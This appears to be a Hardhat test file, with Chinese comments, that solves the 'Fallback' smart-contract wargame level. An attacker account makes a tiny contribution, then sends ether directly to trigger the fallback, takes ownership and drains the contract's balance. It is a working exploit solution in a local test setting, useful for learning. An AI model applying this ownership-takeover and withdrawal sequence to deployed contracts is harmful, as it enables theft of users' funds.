const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Fallback", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const FallbackFactory = await ethers.getContractFactory("Fallback")
    const fallback = await FallbackFactory.connect(deployer).deploy()
    await fallback.waitForDeployment()

    const deployerAddress = await deployer.getAddress()
    const attackerAddress = await attacker.getAddress()
    const fallbackAddress = await fallback.getAddress()

    return { deployer, attacker, fallback, deployerAddress, attackerAddress, fallbackAddress }
  }

  it("Should claim ownership", async () => {
    const { deployer, attacker, fallback, deployerAddress, attackerAddress, fallbackAddress } = await loadFixture(deployFallbackFixture)

    // 部署者的地址 = 合约owner
    expect(await fallback.owner()).to.equal(deployerAddress)

    // 构建攻击者的contribute交互
    const contributeTx = await fallback.connect(attacker).contribute({ value: ethers.parseUnits("100", "wei") })
    await contributeTx.wait()

    // 攻击者的fallback攻击，应claim到合约owner
    const tx2 = {
      to: fallbackAddress,
      value: ethers.parseUnits("100", "wei"),
    }
    const receipt = await attacker.sendTransaction(tx2)
    await receipt.wait()

    expect(await fallback.owner()).to.equal(attackerAddress)

    // 攻击者撤走资金
    const withdrawTx = await fallback.connect(attacker).withdraw()
    await withdrawTx.wait()

    expect(await ethers.provider.getBalance(fallbackAddress)).to.equal(0)
  })
})